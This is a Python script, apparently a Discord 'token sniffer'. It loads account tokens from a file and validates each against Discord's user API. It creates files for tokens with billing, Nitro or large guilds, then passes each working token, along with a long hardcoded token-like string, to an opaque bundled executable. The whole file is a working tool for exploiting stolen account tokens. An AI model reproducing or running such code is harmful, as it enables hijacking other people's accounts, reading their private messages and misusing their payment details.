# -*- coding: utf-8 -*-
try:
    import discord
    import json
    import subprocess
    import sys
    import ctypes
    import time
    import requests
    import os
    import pathlib
    from pathlib import Path
    from datetime import datetime
    from discord.ext import commands
    from colorama import Fore, init
    from os import path
except Exception as e:
    print("Missing Module, install missing module with pip install (module)     ")
    print(f"Debug: {e}")
    input("Press ENTER for exit.            ")
    exit()
def title(content):
    ctypes.windll.kernel32.SetConsoleTitleW(content)
def fileSetup():        
    now = datetime.now()
    folder = f"{cwd}\\{now.strftime('%Y-%m-%d %H-%M-%S')}"
    os.makedirs(folder + "\\tokenData")
    os.makedirs(folder + "\\bestTokens")
    open(folder + "\\bestTokens\\billing.txt", "x")
    open(folder + "\\bestTokens\\nitro.txt", "x")
    open(folder + "\\bestTokens\\guilds.txt", "x")
    return folder
def get_id():
    if 'nt' in os.name: 
        p = subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")
    else:
        return subprocess.Popen('hal-get-property --udi /org/freedesktop/Hal/devices/computer --key system.hardware.uuid'.split())
init(autoreset=True)
red = Fore.LIGHTRED_EX
blue = Fore.LIGHTCYAN_EX
green = Fore.LIGHTGREEN_EX
yellow = Fore.YELLOW
dgreen = Fore.GREEN
white = Fore.RESET
gray = Fore.LIGHTBLACK_EX
title("[Sniffer] Loading...")
cwd = os.getcwd()
def an(content):
    sys.stdout.write(f"{content}\r")
os.system('cls') 
print(f"""{blue}
                ___   ___            
            _ / ___)/ ___)           
  ___  ___ (_) (__ | (__    __  _ __ 
/  __)  _  \ |  __)|  __) / __ \  __)
\__  \ ( ) | | |   | |   (  ___/ |   
(____/_) (_)_)_)   (_)    \____)_)                                                                            
""")
print(f"{gray}[{blue}/{gray}]{white} Search DMS? (y/n): ", end='')
dms = input()
if "y" in dms:
    print(f"{gray}[{blue}/{gray}]{white} DM Searching: {green}On")
    dms = "T"
else:
    print(f"{gray}[{blue}/{gray}]{white} DM Searching: {red}Off")
    dms = "F"
while True:
    print(f"{gray}[{blue}/{gray}]{white} Members Threshold for bestTokens/guilds.txt? (number): ", end='')
    threshold = input()
    try:
        threshold = int(threshold)
    except:
        print(f"{gray}[{red}!{gray}]{white} Not an number.")
    else:
        print(f"{gray}[{blue}/{gray}]{white} Members Threshold: {green}{threshold}")
        break
an(f"{gray}[{blue}/{gray}]{white} Press ENTER to start sniffing.")
input()
title("[Sniffer] Loading Tokens...")
an(f"{gray}[{yellow}:{gray}]{white} Loading 'tokens.txt'...\r")
try:
    with open("tokens.txt", "r") as f:
        tokens = [x.strip() for x in f.readlines()]
    if tokens == []:
        title("[Sniffer] !! No Tokens Found !!")
        print(f"{gray}[{red}!{gray}]{white} 'tokens.txt' is empty. Enter tokens into file and restart.")
        print(f"{gray}[{yellow}!{gray}]{white} Press ENTER to exit.")
        input()
        sys.exit()
    tokens_before = tokens
    tokens = list(dict.fromkeys(tokens))
    title("[Sniffer] Loaded Tokens")
    print(f"{gray}[{green}+{gray}]{white} Loaded {len(tokens)} from 'tokens.txt'. ({len(tokens_before) - len(tokens)} dupes removed)")
except FileNotFoundError:
    print(f"{gray}[{red}!{gray}]{white} File 'tokens.txt' does not exist.")
    an(f"{gray}[{yellow}:{gray}]{white} Creating 'tokens.txt'...")
    f = open("tokens.txt", "x")
    f.close()
    print(f"{gray}[{green}+{gray}]{white} Created 'tokens.txt'. Enter tokens into file and restart.")
    print(f"{gray}[{yellow}!{gray}]{white} Press ENTER to exit.")
    input()
    sys.exit()
except Exception as e:
    print(f"{gray}[{red}!{gray}]{white} An unexpected error has occoured. Contact Chasa#0001 for help.")
    print(f"{gray}[{yellow}!{gray}]{white} Debug info: {e}")
    print(f"{gray}[{yellow}!{gray}]{white} Press ENTER to exit.")
    input()
    sys.exit()
working_tokens = []
dup_ids = []
invalid = 0
duplicate = 0
error = 0
rate_limit = 0
for token in tokens:
    print(f"{blue}----- {white}Token #{tokens.index(token) + 1} {blue}-----")
    an(f"{gray}[{yellow}:{gray}]{white} Checking token #{tokens.index(token) + 1}...")
    time.sleep(0.05)
    headers = { 
        "Content-Type": "application/json", 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Authorization": token
    }
    try:
        req = requests.get("https://discord.com/api/users/@me", headers=headers)
        if req.status_code == 200:
            userData = req.json()
            if userData['id'] not in dup_ids:
                print(f"{gray}[{green}+{gray}]{white} Logged in. ({userData['username']}#{userData['discriminator']})          ")
                dup_ids.append(userData["id"])
                working_tokens.append(token)
                title(f"[Sniffer] Checked: {len(working_tokens) + invalid + duplicate + error}/{len(tokens)} // Valid: {len(working_tokens)} // Invalid: {invalid} // Duplicate: {duplicate} // Rate Limit: {rate_limit} // Error: {error}")
            else:
                print(f"{gray}[{red}-{gray}]{white} Duplicate User. ({userData['username']}#{userData['discriminator']})      ")
                duplicate += 1
                title(f"[Sniffer] Checked: {len(working_tokens) + invalid + duplicate + error}/{len(tokens)} // Valid: {len(working_tokens)} // Invalid: {invalid} // Duplicate: {duplicate} // Rate Limit: {rate_limit} // Error: {error}")
        elif("You are being rate limited." in req.text):
            print(f"{gray}[{red}-{gray}]{white} Rate Limited.          ")
            rate_limit += 1
        else:
            print(f"{gray}[{red}-{gray}]{white} Invalid token.         ")
            invalid += 1
            title(f"[Sniffer] Checked: {len(working_tokens) + invalid + duplicate + error}/{len(tokens)} // Valid: {len(working_tokens)} // Invalid: {invalid} // Duplicate: {duplicate} // Rate Limit: {rate_limit} // Error: {error}")
    except Exception as e:
        print(f"{gray}[{red}-{gray}]{white} Error. (Debug: {e})")
        error += 1
        title(f"[Sniffer] Checked: {len(working_tokens) + invalid + duplicate + error}/{len(tokens)} // Valid: {len(working_tokens)} // Invalid: {invalid} // Duplicate: {duplicate} // Rate Limit: {rate_limit} // Error: {error}")
    else:
        pass
if len(working_tokens) > 0:
    folder = fileSetup()
else:
    pass
f = open(folder + "\\working.txt", "a")
open(folder + "\\all_data.txt", "x").close()
for token in working_tokens:
    print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
    title(f"[Sniffer] Sniffing Token {working_tokens.index(token) + 1}/{len(working_tokens)}...")
    f.writelines(f"{token}\n")
    print(f"{yellow}[:]{white} Loading Token #{working_tokens.index(token) + 1}")
    subprocess.call(f'dont_rename.exe {token} "{folder}" {dms} {threshold} ODDFOFXUpgf7yEntul5ockCA.OFk6Ph.lmsA54bT0Fux1IpsYvey5XuZk04MTdqrd0vGDV1dcF0QPjom6OB.NQxUhj.I4JjFHIympR3mVF3UiUbbD5VVbiNTzQvPcLBacBmgajXQc7QAaU.XCgboz.c4t51kFWSEmdmaPnKoyUuu8E78E', shell=True)
    f3 = open
f.close()
title("[Sniffer] Completed.")
print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
print(f"{gray}[{green}+{gray}]{white} Completed all tokens. Press ENTER to exit.")
input()